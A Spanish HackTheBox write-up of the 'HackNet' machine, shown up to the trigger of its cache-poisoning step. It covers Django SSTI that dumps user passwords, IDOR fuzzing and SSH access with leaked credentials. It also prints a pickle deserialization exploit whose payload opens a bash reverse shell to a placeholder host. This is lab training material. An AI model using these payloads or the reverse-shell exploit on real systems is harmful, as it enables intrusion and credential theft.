---
title: HackNet - Medium (HTB)
permalink: /HackNet-HTB-Writeup/
tags:
  - Linux
  - Medium
  - Django
  - SSTI
  - IDOR
  - Cache Poisoning
  - GPG
  - Brute Force
  - Credentials Leakage
categories:
  - writeup
  - hacking
  - hackthebox
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
seo_tittle: HackNet - Medium (HTB)
seo_description: Explota SSTi, IDOR y archivos de caché en Django, abusa de copias de seguridad cifradas que contienen credenciales privilegiadas para vencer HackNet.
excerpt: Explota SSTi, IDOR y archivos de caché en Django, abusa de copias de seguridad cifradas que contienen credenciales privilegiadas para vencer HackNet.
header:
  overlay_image: /assets/images/headers/hacknet-hackthebox.jpg
  overlay_filter: 0.7
  og_image: /assets/images/headers/hacknet-hackthebox.jpg
---
![image-center](/assets/images/posts/hacknet-hackthebox.png)
{: .align-center}

**Habilidades:**  Server-Side Template Injection (SSTI), Insecure Object Direct Reference (IDOR), System Enumeration, `Django` Cache Poisoning, GPG Files Decrypt - Brute Force, Credentials Leakage [Privilege Escalation]
{: .notice--primary}

# Introducción

HackNet es una máquina Linux de dificultad `Medium` en HackTheBox donde debemos vulnerar un sitio web hecho en `Django` a través de la vulnerabilidad `SSTI` e `IDOR` para obtener credenciales de un usuario supuestamente privado, las cuales nos permitirán ganar acceso inicial al servidor.

Abusaremos del almacenamiento en caché basado en archivos de `Django` y copias de configuración de una base de datos cifrada con `GPG`, la cual contiene credenciales privilegiadas para obtener acceso completo al sistema.
<br>
# Reconocimiento
---
Enviaremos una traza ICMP para comprobar que la máquina víctima se encuentre activa

``` bash
ping -c1 10.129.232.4             
PING 10.129.232.4  (10.129.232.4 ): 56 data bytes
64 bytes from 10.129.232.4 : icmp_seq=0 ttl=63 time=258.777 ms

--- 10.129.232.4  ping statistics ---
1 packets transmitted, 1 packets received, 0.0% packet loss
round-trip min/avg/max/stddev = 258.777/258.777/258.777/0.000 ms
```


## Port Scanning 

Comenzaremos lanzando un escaneo de puertos que se encargue de descubrir puertos abiertos en la máquina víctima

~~~ bash
sudo nmap -p- --open -sS --min-rate 5000 -n -Pn 10.129.232.4  -oG openPorts

Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-16 12:47 -0300
Nmap scan report for 10.129.232.4
Host is up (0.15s latency).
Not shown: 42060 closed tcp ports (reset), 23473 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 44.98 seconds
~~~

- `--open`: Mostrar únicamente los puertos abiertos
- `-p-`: Hacer un escaneo del total de puertos **(65535)**
- `--min-rate 5000`: Enviar mínimo **5000 paquetes por segundo**
- `-n`: No aplicar **resolución DNS**, lo que acelera el escaneo
- `-sS`: Modo de **escaneo TCP SYN**, no concluye la conexión, lo que hace el escaneo más ágil
- `-Pn`: Omitir el **descubrimiento de host (ARP)**
- `-oG`: Exportar en formato `grepable`
- `-v`: Ver el progreso del escaneo

Realizaremos un segundo escaneo dirigido a los servicios descubiertos, con el fin de identificar la versión y los servicios que se ejecutan en estos puertos

~~~ bash
nmap -p 22,80 -sVC 10.129.232.4 -oN services

Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-16 12:48 -0300
Nmap scan report for 10.129.232.4
Host is up (0.15s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey: 
|   256 95:62:ef:97:31:82:ff:a1:c6:08:01:8c:6a:0f:dc:1c (ECDSA)
|_  256 5f:bd:93:10:20:70:e6:09:f1:ba:6a:43:58:86:42:66 (ED25519)
80/tcp open  http    nginx 1.22.1
|_http-title: Did not follow redirect to http://hacknet.htb/
|_http-server-header: nginx/1.22.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.19 seconds
~~~

- `-p`: Especificar puertos
- `-sV`: Identificar la versión del servicio 
- `-sC`: Uso de scripts de reconocimiento
- `-oN`: Exportar la salida en formato normal

Vemos dos servicios, `ssh` y `http`, por las versiones no parecen haber vulnerabilidades explotables en este contexto.

El servidor web nos intenta aplicar una redirección hacia `hacknet.htb`, agregaremos este nombre de dominio a nuestro archivo `/etc/hosts` para aplicar correctamente la resolución DNS

``` bash
echo '10.129.232.4 hacknet.htb' | sudo tee -a /etc/hosts

10.129.232.4 hacknet.htb
```


## Web Enumeration

Antes de navegar hasta `hacknet.htb` mediante un navegador, opcionalmente podemos lanzar un escaneo a las tecnologías web que el servidor pueda esta utilizando para gestionar el contenido de la web

``` bash
whatweb http://hacknet.htb

http://hacknet.htb [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.22.1], IP[10.129.232.4], JQuery[3.7.1], Title[HackNet - social network for hackers], UncommonHeaders[x-content-type-options,referrer-policy,cross-origin-opener-policy], X-Frame-Options[DENY], nginx[1.22.1]
```

La web parece ser una plataforma de red social para `hackers`. Además de las versiones de `nginx` y `jquery`, existen cabeceras HTTP inusuales:

- `X-Content-Type-Options: nosniff`: Defensa crucial contra ataques `MIME-type Sniffing`.
- `Referrer-Policy: same-origin`: Previene fugas de datos al controlar estrictamente las URL según el encabezado `Referer`.
- `Cross-Origin-Opener-Policy: same-origin`:  Aislamiento a nivel de proceso del navegador, previene ataques `XS-Leaks`.

Al navegar hasta el dominio `hacknet.htb`, veremos la siguiente página de bienvenida

![image-center](/assets/images/posts/hacknet-1-hackthebox.png)
{: .align-center}

 `Wappalyzer` muestra que la plataforma está hecha en `Django`, esto nos será útil a la hora de buscar vectores de entrada.

> `Django` es un framework web gratuito y de código abierto escrito en `Python` que permite crear aplicaciones web de forma rápida y eficiente, ofrece módulos reutilizables para funciones comunes como autenticación y manejo de bases de datos.
{: .notice--info}

![image-center](/assets/images/posts/hacknet-2-hackthebox.png)
{: .align-center}

Podemos tanto iniciar sesión como registrar una cuenta haciendo click en `Login` o en `Sign Up`.

Crearemos una cuenta en `/register` e iniciaremos sesión con ella para acceder a la plataforma (lo que parece extremadamente obvio pero igual cabe mencionar)

![image-center](/assets/images/posts/hacknet-3-hackthebox.png)
{: .align-center}

Al ingresar a la plataforma, el servidor nos redirige a nuestro perfil, el cual podemos visitar bajo la ruta`/profile`

![image-center](/assets/images/posts/hacknet-4-hackthebox.png)
{: .align-center}

### Search

Desde la pestaña `Search` bajo la ruta `/search`, es posible buscar a usuarios existentes en la plataforma web

![image-center](/assets/images/posts/hacknet-5-hackthebox.png)
{: .align-center}

> Un dato a tener en cuenta es que el usuario `backdoor_bandit` posee un perfil privado.
{: .notice--warning}

![image-center](/assets/images/posts/hacknet-6-hackthebox.png)
{: .align-center}

### Explore

Desde la pestaña `Explore` bajo la ruta `/explore`, se nos permite buscar publicaciones utilizando palabras clave

![image-center](/assets/images/posts/hacknet-7-hackthebox.png)
{: .align-center}

### To like a post

Al dar `like` a una publicación, si interceptamos la solicitud, veremos que se envía al servidor a través del endpoint `/like/<ID>`. El servidor responderá un código `200 OK` del mensaje `Success`

![image-center](/assets/images/posts/hacknet-8-hackthebox.png)
{: .align-center}

Cuando forzamos un `ID` de un post que no existe, obtendremos un código de error `404`

![image-center](/assets/images/posts/hacknet-9-hackthebox.png)
{: .align-center}

### Likes

Además, podemos desplegar una lista con los usuarios que dieron `like` a una publicación al presionar `likes`

![image-center](/assets/images/posts/hacknet-10-hackthebox.png)
{: .align-center}

Por detrás se realiza una solicitud hacia el endpoint `/likes/<ID>`

![image-center](/assets/images/posts/hacknet-11-hackthebox.png)
{: .align-center}
<br>


# Intrusión / Explotación
---
## Server-Side Template Injection (SSTI)

> La inyección de plantillas del lado del servidor (`SSTI`) es una vulnerabilidad en la que la entrada del usuario se incrusta en una plantilla del lado del servidor de forma insegura. 
> 
> Esto permite a los atacantes inyectar directivas de plantilla que ejecutan código arbitrario en el servidor.
{: .notice--info}

El servidor responde correctamente a pruebas de [`SSTI`](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md#django), por ejemplo editando nuestro nombre de usuario usando payloads básicos de detección como: `{{ csrf_token }}`

![image-center](/assets/images/posts/hacknet-12-hackthebox.png)
{: .align-center}

Al cargar la lista de usuarios en un post al que le dimos `like`, veremos el valor del `csrf_token` cuando en la plantilla se intenta cargar nuestro nombre de usuario

![image-center](/assets/images/posts/hacknet-13-hackthebox.png)
{: .align-center}

### Users

Como este proyecto se trata de un blog, podemos intuir que internamente existen variables como `user`, `users`, `posts`,`post`, etc. Haremos un primer intento accediendo a la variable `users`

![image-center](/assets/images/posts/hacknet-14-hackthebox.png)
{: .align-center}

Cuando esta variable sea cargada en la plantilla, retornará un `Queryset` con la colección de los objetos de tipo `SocialUser`.

> Un `QuerySet` en `Django` es una colección de objetos de una base de datos, como una lista, que permite leer, filtrar y ordenar datos de manera eficiente antes de obtenerlos.
{: .notice--info}

![image-center](/assets/images/posts/hacknet-15-hackthebox.png)
{: .align-center}

Al decodificar esta colección desde URL, el `QuerySet` lucirá de la siguiente manera, mostrando todos los nombres de usuario existentes

``` http
<QuerySet [<SocialUser: hexhunter>, <SocialUser: shadowcaster>, <SocialUser: blackhat_wolf>, <SocialUser: glitch>, <SocialUser: codebreaker>, <SocialUser: shadowmancer>, <SocialUser: whitehat>, <SocialUser: brute_force>, <SocialUser: shadowwalker>, <SocialUser: {{ users }}>]>
```

### Users Data Exfiltration

Según la [documentación de `Django`](https://docs.djangoproject.com/en/6.0/ref/models/querysets/#values), la función `values()` retorna diccionarios, los cuales representan un objeto, con las claves correspondientes a los valores de los atributos del modelo.

Actualizaremos nuestro payload en nuestro perfil de usuario por `{{ users.values }}`

![image-center](/assets/images/posts/hacknet-16-hackthebox.png)
{: .align-center}

Al volver a consultar los `likes` de la publicación nuevamente, veremos un `QuerySet` que contiene un diccionario con todos los datos correspondientes a los usuarios que dieron `like` a esta publicación

![image-center](/assets/images/posts/hacknet-17-hackthebox.png)
{: .align-center}

También podemos hacer esto mediante `curl`, donde aplicando una serie de filtros para que la salida sea más legible

``` bash
curl -s 'http://hacknet.htb/likes/10' -b 'csrftoken=GQd8GAw8CraIEoUQN2FV5Lnsow63iZOt; sessionid=mhq02dxbqxuwtcpdnhmit9drv6qndpx6' | pup 'img attr{title}' | sed -n 10p | sed "s/&#39;/'/g; s/&lt;/</g; s/&gt;/>/g" | tr ',' '\n' | head
 
<QuerySet [{'id': 2
 'email': 'hexhunter@ciphermail.com'
 'username': 'hexhunter'
 'password': 'H3xHunt3r!'
 'picture': '2.jpg'
 'about': 'A seasoned reverse engineer specializing in binary exploitation. Loves diving into hex editors and uncovering hidden data.'
 'contact_requests': 0
 'unread_messages': 0
 'is_public': True
 'is_hidden': False
```

- `pup 'img attr{title}'`: Procesar el contenido HTML y extraer el valor del campo `title` en la etiqueta `img`.
- `sed -n 10p` (solo en contexto actual): Filtramos por la posición `10` de usuarios, la cual corresponde a nuestro nombre renderizado por la plantilla.
- `sed "s/&#39;/'/g; s/&lt;/</g; s/&gt;/>/g"`: En este caso traduce los códigos HTML a caracteres visibles en la terminal.
- `tr ',' '\n'`: Reemplazar las `,` por saltos de línea (personalmente más cómodo a la hora de leer).
- `head`: Mostrar solamente un conjunto de líneas de la salida, por defecto `10`.

Podemos aplicar filtros aún más avanzados para obtener un listado rápido con datos interesantes de cada usuario, como `email`, `username` y `password`

``` bash
curl -s 'http://hacknet.htb/likes/10' -b 'csrftoken=GQd8GAw8CraIEoUQN2FV5Lnsow63iZOt; sessionid=mhq02dxbqxuwtcpdnhmit9drv6qndpx6' | pup 'img attr{title}' | sed -n 10p | sed "s/&#39;/'/g; s/&lt;/</g; s/&gt;/>/g" | grep -oP "('email': '|'username': '|'password': ')\K[^']+" | sed 'N;N; s/\n/:/g' | tee users.txt

hexhunter@ciphermail.com:hexhunter:H3xHunt3r!
shadowcaster@darkmail.net:shadowcaster:Sh@d0wC@st!
blackhat_wolf@cypherx.com:blackhat_wolf:Bl@ckW0lfH@ck
glitch@cypherx.com:glitch:Gl1tchH@ckz
codebreaker@ciphermail.com:codebreaker:C0d3Br3@k!
shadowmancer@cypherx.com:shadowmancer:Sh@d0wM@ncer
whitehat@darkmail.net:whitehat:Wh!t3H@t2024
brute_force@ciphermail.com:brute_force:BrUt3F0rc3#
shadowwalker@hushmail.com:shadowwalker:Sh@dowW@lk2024
incommatose@test.com:{{ users.values }}:incommatose
```

- `grep -oP "('email': '|'username': '|'password': ')\K[^']+"`: Búsqueda por los campos `email`, `username` y `password` en el diccionario.
-  `sed 'N;N; s/\n/:/g'`: Reemplazar cada salto de línea por `:`, donde con `N` añadimos la siguiente línea al buffer para que sea procesada igual que la actual, en este caso usamos `N;N;` para añadir las siguientes `2` líneas.
- `tee users.txt`: Guardar la salida en `users.txt` y mostrarla por consola a la vez.


## Insecure Object Direct Reference (IDOR)

> IDOR (`Insecure Direct Object Reference`), es una vulnerabilidad crítica donde una aplicación permite a un usuario acceder directamente a objetos internos (archivos, registros de bases de datos, IDs de usuarios) sin una adecuada validación de permisos.
{: .notice--info}

Como el endpoint `/likes` nos permite listar a los usuarios que dieron `like` a un `post`, podemos intentar aplicar `Fuzzing` para encontrar `posts` a los que el usuario `backdoor_bandit` (el usuario privado que vimos anteriormente) haya dado `like`. 

> En este caso usaré una Regex que busca la palabra`backdoor_bandit` en el campo `title` de la etiqueta `img` (sí, aunque parezca una forma un poco `dirty`, funciona).
{: .notice--warning}

``` bash
seq 1 99 > nums.txt # Generar wordlist con números del 1 al 99

ffuf -fc 404 -mr 'title="([^"]*backdoor_bandit[^"]*)"' -w nums.txt -b 'Cookie: csrftoken=GQd8GAw8CraIEoUQN2FV5Lnsow63iZOt; sessionid=wlefvnjmdu0ucuraxknvwbrxytc3s0db' -u 'http://hacknet.htb/likes/FUZZ' -t 1

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://hacknet.htb/likes/FUZZ
 :: Wordlist         : FUZZ: /Users/andrees/machines/htb/hacknet/exploits/nums.txt
 :: Header           : Cookie: Cookie: csrftoken=GQd8GAw8CraIEoUQN2FV5Lnsow63iZOt; sessionid=wlefvnjmdu0ucuraxknvwbrxytc3s0db
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 1
 :: Matcher          : Regexp: title="([^"]*backdoor_bandit[^"]*)"
 :: Filter           : Response status: 404
________________________________________________

23                      [Status: 200, Size: 112, Words: 5, Lines: 1, Duration: 613ms]
:: Progress: [99/99] :: Job [1/1] :: 6 req/sec :: Duration: [0:00:33] :: Errors: 0 ::
```

De esta forma veremos que solamente se muestra un `ID`, en teoría este post es el único al que el usuario `backdoor_bandit` le dio `like`

### SSTI

Utilizaremos el mismo concepto del SSTI que logramos explotar para ver las propiedades del usuario en este `post`, comenzaremos dando `like` a la misma publicación, podemos hacerlo mediante `curl`

``` bash
curl 'http://hacknet.htb/like/23' -b 'csrftoken=GQd8GAw8CraIEoUQN2FV5Lnsow63iZOt; sessionid=wlefvnjmdu0ucuraxknvwbrxytc3s0db'; echo

Success                  
```

Ahora consultaremos los `likes` de la publicación con el `ID 23`, de la siguiente manera, veremos que el SSTI funciona y vemos el objeto `SocialUser`, donde solo aparece `backdoor_bandit`

``` bash
curl -s 'http://hacknet.htb/likes/23' -b 'csrftoken=GQd8GAw8CraIEoUQN2FV5Lnsow63iZOt; sessionid=mhq02dxbqxuwtcpdnhmit9drv6qndpx6' | pup 'img attr{title}' | sed -n 2p | sed "s/&#39;/'/g; s/&lt;/</g; s/&gt;/>/g" | ggrep -oP "('email': '|'username': '|'password': ')\K[^']+" | sed 'N;N; s/\n/:/g' | tee private_user.txt

mikey@hacknet.htb:backdoor_bandit:mYd4rks1dEisH3re
incommatose@test.com:{{ users.values }}:incommatose
```

> En este caso debemos ajustar el filtro `sed -n 2p`, porque solamente hay dos registros de `likes`, el usuario privado y nosotros.
{: .notice--warning}

¡Bingo!, tenemos el registro del usuario `backdoor_bandit`, el cual supuestamente era un usuario oculto


## Shell as `mikey`

Como tenemos credenciales que no deberíamos poder ver, las validaremos frente al servicio `ssh` con `netexec`, usando el usuario del campo `email`, el cual es `mikey`

``` bash
nxc ssh hacknet.htb -u 'mikey' -p 'mYd4rks1dEisH3re'
SSH         10.129.232.4    22     hacknet.htb      [*] SSH-2.0-OpenSSH_9.2p1 Debian-2+deb12u7
SSH         10.129.232.4    22     hacknet.htb      [+] mikey:mYd4rks1dEisH3re  Linux - Shell access!
```

Como las credenciales son válidas, podremos conectarnos por `ssh` a la máquina como el usuario `mikey`

``` bash
ssh mikey@hacknet.htb
mikey@hacknet.htb\'s password: 
Linux hacknet 6.1.0-38-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.147-1 (2025-08-02) x86_64
...
<SNIP>
...
Last login: Tue Jan 20 14:47:50 2026 from 10.10.14.54
mikey@hacknet:~$ export TERM=xterm
mikey@hacknet:~$ id
uid=1000(mikey) gid=1000(mikey) groups=1000(mikey)
```

Ya podremos ver la flag del usuario sin privilegios

``` bash
mikey@hacknet:~$ cat user.txt 
b02...
```
<br>


# Escalada de Privilegios
---
## System Enumeration

En este punto nos encontramos dentro del servidor, aunque aparentemente no poseemos privilegios suficientes para realizar acciones administrativas en el sistema. Confirmaremos que estamos en la máquina víctima al ver la IP que muestra HackTheBox

``` bash
mikey@hacknet:~$ hostname -I
10.129.232.4 
```

Enumeraremos el servidor en búsqueda de posibles vectores para escalar privilegios o movernos lateralmente

### Users

Al consultar el archivo `passwd` en busca de usuarios válidos en el sistema, veremos que existe uno llamado `sandy` además de `mikey` y `root`

``` bash
mikey@hacknet:~$ cat /etc/passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
mikey:x:1000:1000:mikey,,,:/home/mikey:/bin/bash
sandy:x:1001:1001::/home/sandy:/bin/bash
```

### `Nginx` Config

Como sabemos que el servidor web utiliza `nginx`, podemos enumerar los sitios disponibles bajo la ruta `/etc/nginx/sites-available`

``` bash
mikey@hacknet:~$ ls -la /etc/nginx/sites-available/
total 16
drwxr-xr-x 2 root root 4096 Sep  4 14:59 .
drwxr-xr-x 8 root root 4096 Sep  4 14:59 ..
-rw-r--r-- 1 root root 2464 May 31  2024 default
-rw-r--r-- 1 root root  349 May 31  2024 HackNet
```

Obviamente veríamos el sitio `HackNet`, consultaremos este archivo para ver la configuración del servidor

``` bash
mikey@hacknet:~$ cat /etc/nginx/sites-available/HackNet 
server {
    listen 80;
    server_name hacknet.htb;

    location = /favicon.ico { access_log off; log_not_found off; }
    location /static/ {
        root /var/www/HackNet;
    }
    location /media  {
        root /var/www/HackNet;
    }

    location / {
        include proxy_params;
        proxy_pass http://unix:/run/gunicorn.sock;
    }
}
```

Las rutas `/static/` y `/media` son hosteadas por el servidor web desde el directorio `/var/www/HackNet`

``` bash
mikey@hacknet:~$ ls -la /var/www/HackNet/
total 32
drwxr-xr-x 7 sandy sandy    4096 Feb 10  2025 .
drwxr-xr-x 4 root  root     4096 Jun  2  2024 ..
drwxr-xr-x 2 sandy sandy    4096 Dec 29  2024 backups
-rw-r--r-- 1 sandy www-data    0 Aug  8  2024 db.sqlite3
drwxr-xr-x 3 sandy sandy    4096 Sep  8 05:20 HackNet
-rwxr-xr-x 1 sandy sandy     664 May 31  2024 manage.py
drwxr-xr-x 2 sandy sandy    4096 Aug  8  2024 media
drwxr-xr-x 6 sandy sandy    4096 Sep  8 05:22 SocialNetwork
drwxr-xr-x 3 sandy sandy    4096 May 31  2024 static
```

### `Gunicorn` Service

Mientras todas las demás solicitudes son dirigidas a un `socket` de Unix ubicado en el directorio `/run` a través de un proxy. Este socket es el que ejecuta la aplicación de `Django` usando `gunicorn`.

> `Gunicorn` (`Green Unicorn`) es un servidor WSGI (`Web Server Gateway Interface`) de alto rendimiento, escrito en `Python` puro, diseñado para ejecutar aplicaciones web `Python` en entornos de producción como `Django` o `Flask`.
{: .notice--info}

``` bash
mikey@hacknet:~$ find / -name gunicorn.sock 2>/dev/null
/run/gunicorn.sock
mikey@hacknet:~$ ls -la /run/gunicorn.sock
srw-rw-rw- 1 root root 0 Jan 20 09:39 /run/gunicorn.sock
```

> No es que esto sea un archivo, el bit `s` nos indica que se trata de un `socket`.
{: .notice--info}

Podemos consultar el servicio `gunicorn` usando comandos como `systemctl`, aunque no tenemos permisos para administrarlo, al menos podremos ver la ruta de configuración

``` bash
mikey@hacknet:~$ systemctl status gunicorn
● gunicorn.service - gunicorn daemon
     Loaded: loaded (/etc/systemd/system/gunicorn.service; disabled; preset: enabled)
     Active: active (running) since Tue 2026-01-20 12:48:36 EST; 2h 21min ago
TriggeredBy: ● gunicorn.socket
   Main PID: 25396
      Tasks: 4 (limit: 2300)
     Memory: 128.1M
        CPU: 5.969s
     CGroup: /system.slice/gunicorn.service
             ├─25396 /usr/bin/python3 /home/sandy/.local/bin/gunicorn --access-logfile - --workers 3 --bind unix:/run/gunicorn.sock HackNet.wsgi:applic>
             ├─25399 /usr/bin/python3 /home/sandy/.local/bin/gunicorn --access-logfile - --workers 3 --bind unix:/run/gunicorn.sock HackNet.wsgi:applic>
             ├─25400 /usr/bin/python3 /home/sandy/.local/bin/gunicorn --access-logfile - --workers 3 --bind unix:/run/gunicorn.sock HackNet.wsgi:applic>
             └─25401 /usr/bin/python3 /home/sandy/.local/bin/gunicorn --access-logfile - --workers 3 --bind unix:/run/gunicorn.sock HackNet.wsgi:applic>

Warning: some journal files were not opened due to insufficient permissions.
```

Al parecer el usuario `sandy` ejecuta este servicio para lanzar la aplicación web. Esto significa que si logramos ejecutar comandos a través de `Django`, lo haremos como el usuario `sandy` (lo más común es que sean ejecutadas por `www-data`)

``` bash
mikey@hacknet:~$ cat /etc/systemd/system/gunicorn.service
[Unit]
Description=gunicorn daemon
Requires=gunicorn.socket
After=network.target

[Service]
User=sandy
Group=www-data
WorkingDirectory=/var/www/HackNet
ExecStart=/home/sandy/.local/bin/gunicorn \
          --access-logfile - \
          --workers 3 \
          --bind unix:/run/gunicorn.sock \
          HackNet.wsgi:application

[Install]
WantedBy=multi-user.target
```

### `Django` Project

El proyecto se estructura más o menos de la siguiente manera, donde el directorio `HackNet` posee los archivos de configuración del proyecto de `Django`, mientras que `SocialNetwork` aloja los archivos de la app

``` bash
.
├── HackNet
│   ├── __init__.py
│   ├── __pycache__
│   │   ├── __init__.cpython-311.pyc
│   │   ├── settings.cpython-311.pyc
│   │   ├── urls.cpython-311.pyc
│   │   └── wsgi.cpython-311.pyc
│   ├── asgi.py
│   ├── settings.py
│   ├── urls.py
│   └── wsgi.py
├── SocialNetwork
│   ├── __init__.py
│   ├── __pycache__
│   │   ├── __init__.cpython-311.pyc
│   │   ├── admin.cpython-311.pyc
│   │   ├── apps.cpython-311.pyc
│   │   ├── forms.cpython-311.pyc
│   │   ├── models.cpython-311.pyc
│   │   ├── news_generator.cpython-311.pyc
│   │   ├── urls.cpython-311.pyc
│   │   └── views.cpython-311.pyc
│   ├── admin.py
│   ├── apps.py
│   ├── models.py
│   ├── news_generator.py
│   ├── urls.py
│   └── views.py
├── backups
│   ├── backup01.sql.gpg
│   ├── backup02.sql.gpg
│   └── backup03.sql.gpg
├── db.sqlite3
└── manage.py
```

El archivo `settings.py` es el centro de la configuración de un proyecto `Django`, algo interesante es que veremos credenciales para conectarnos a la base de datos

``` bash
DATABASES = {
    'default': {
        'ENGINE': 'django.db.backends.mysql',
        'NAME': 'hacknet',
        'USER': 'sandy',
        'PASSWORD': 'h@ckn3tDBpa$$',
        'HOST':'localhost',
        'PORT':'3306',
    }
}
```

Estas credenciales no se reutilizan como para intentar iniciar sesión como sandy

``` bash
mikey@hacknet:/var/www/HackNet$ su sandy
Password: 
su: Authentication failure
```

Si intentamos enumerar la base de datos, veremos el hash de un usuario que nos nos sirve pa na, así que seguiremos enumerando

### Source Code Analysis

En el código de la web dentro del archivo `views.py`, el cual está en el directorio `SocialNetwork`, veremos un decorador para la función `explore`

> El archivo `views.py` contiene la lógica de negocio de una aplicación de `Django`, en él se definen funciones o vistas que procesan las solicitudes HTTP y devuelven respuestas.
{: .notice--info}

``` python
...
<SNIP>
...

@cache_page(60)
def explore(request):
    if not "email" in request.session.keys():
        return redirect("index")

    session_user = get_object_or_404(SocialUser, email=request.session['email'])

    page_size = 10
    keyword = ""
...
<SNIP>
...
```

 - `@cache_page(60)`: Este decorador le dice a `Django` que guarde el resultado de esa función en la memoria caché durante `60` segundos.

La configuración de caché se guarda dentro de `settings.py`, donde veremos que la ruta donde se almacena esta memoria caché es `/var/tmp/django_cache`

``` bash
CACHES = {
    'default': {
        'BACKEND': 'django.core.cache.backends.filebased.FileBasedCache',
        'LOCATION': '/var/tmp/django_cache',
        'TIMEOUT': 60,
        'OPTIONS': {'MAX_ENTRIES': 1000},
    }
}
```

> Con la línea `'TIMEOUT': 60` entendemos que los archivos expirarán cada `60` segundos.
{: .notice--danger}


## `Django` Cache Poisoning

El método de almacenamiento de caché de `Django` utiliza el módulo [`pickle`](https://docs.python.org/3/library/pickle.html#module-pickle) de `Python`. Si un atacante puede obtener acceso de escritura a la caché, puede escalar privilegios mediante la deserialización

### Understanding Vulnerability

En `Django`, es posible configurar la forma de almacenar la caché en lo que se conoce como [`backends`](https://docs.djangoproject.com/en/6.0/topics/cache/#setting-up-the-cache). Una de estas formas es [`FileBasedCache`](https://docs.djangoproject.com/en/6.0/topics/cache/#filesystem-caching) (puedes consultar el código en [`Github`](https://github.com/django/django/blob/48a1929ca050f1333927860ff561f6371706968a/django/core/cache/backends/filebased.py#L16)), el cual serializa y almacena cada valor de la caché como un archivo independiente.

El problema viene porque el módulo `pickle` puede deserializar (`unpickling`) cualquier dato, por lo que el mayor riesgo a la hora de implementar este módulo es solamente utilizarlo con datos en los que confiemos.

### Exploiting

Necesitamos enviar una solicitud hacia `/explore` para generar los archivos de caché en el servidor, debido a que cada 60 segundos son eliminados por `Django`

``` bash
curl -sI 'http://hacknet.htb/explore' -b 'csrftoken=GQd8GAw8CraIEoUQN2FV5Lnsow63iZOt; sessionid=mhq02dxbqxuwtcpdnhmit9drv6qndpx6'

HTTP/1.1 200 OK
Server: nginx/1.22.1
Date: Tue, 20 Jan 2026 21:05:08 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 14922
Connection: keep-alive
Expires: Tue, 20 Jan 2026 21:06:08 GMT
Cache-Control: max-age=60
X-Frame-Options: DENY
Vary: Cookie
X-Content-Type-Options: nosniff
Referrer-Policy: same-origin
Cross-Origin-Opener-Policy: same-origin
Set-Cookie: sessionid=mhq02dxbqxuwtcpdnhmit9drv6qndpx6; expires=Tue, 03 Feb 2026 21:05:08 GMT; HttpOnly; Max-Age=1209600; Path=/; SameSite=Lax
```

Esto generará dos archivos de caché en el directorio `/var/tmp/django_cache`

``` bash
mikey@hacknet:/var/www/HackNet$ ls /var/tmp/django_cache/
1f0acfe7480a469402f1852f8313db86.djcache  bb30543c94c1b491562da2fba9a0ed46.djcache
```

En cuanto a permisos de archivos, solamente `sandy` puede manipular los archivos `.djcache`.

Sin embargo, el directorio posee escritura para cualquier usuario (`world-writable`)

``` bash
mikey@hacknet:/var/www/HackNet$ ls -la /var/tmp/django_cache/
total 16
drwxrwxrwx 2 sandy www-data 4096 Jan 20 16:05 .
drwxrwxrwt 4 root  root     4096 Jan 20 09:39 ..
-rw------- 1 sandy www-data   34 Jan 20 16:05 1f0acfe7480a469402f1852f8313db86.djcache
-rw------- 1 sandy www-data 2784 Jan 20 16:05 bb30543c94c1b491562da2fba9a0ed46.djcache
```

### Python Scripting

El siguiente script en `python` hace uso de `pickle` para deserializar un payload y escribirlo en el directorio `/var/tmp/django_cache`

``` python
#!/usr/bin/env python3 
# cache_abuse.py

import pickle
import os

target_dir = '/var/tmp/django_cache'
cmd = '/bin/bash -c "/bin/bash -i >& /dev/tcp/IP/PORT 0>&1"'

class Exploit:  
    def __reduce__(self):  
        return (os.system, (cmd,))

payload = pickle.dumps(Exploit()) # Deserialización con pickle

for f in os.listdir(target_dir):
    full_path = os.path.join(target_dir, f)

    if os.path.isfile(full_path) and f.endswith('.djcache'):
        new_path = full_path + '.bk'
        os.rename(full_path, new_path)

    with open(full_path, 'wb') as f:
        f.write(payload)

    print(f'{full_path} was unpickled successfully!')
```

Ejecutaremos el script para envenenar la caché, debemos ser rápidos porque solamente tenemos un minuto para lanzar la shell

``` bash
mikey@hacknet:/var/tmp/django_cache$ python3 /tmp/cache_abuse.py 
/var/tmp/django_cache/1f0acfe7480a469402f1852f8313db86.djcache was unpickled successfully!
/var/tmp/django_cache/90dbab8f3b1e54369abdeb4ba1efc106.djcache was unpickled successfully!
```

Iniciaremos un listener para recibir la conexión a un puerto determinado, debemos usar el mismo que definimos en el exploit lógicamente

``` bash
nc -lvnp 443
```

### Trigger

Para forzar la ejecución del comando que inyectamos en caché, visitaremos la ruta `/explore` o podemos hacer una solicitud HTTP nuevamente con `curl` usando las `cookies` 

``` bash
curl -sI 'http://hacknet.htb/explore' -b 'csrftoken=GQd8GAw8CraIEoUQN2FV5Lnsow63iZOt; sessionid=mhq02dxbqxuwtcpdnhmit9drv6qndpx6'
```

Si lo ejecutamos desde la web veremos un error `502`, esta es la clara señal de que ejecutamos nuestro archivo de caché malicioso

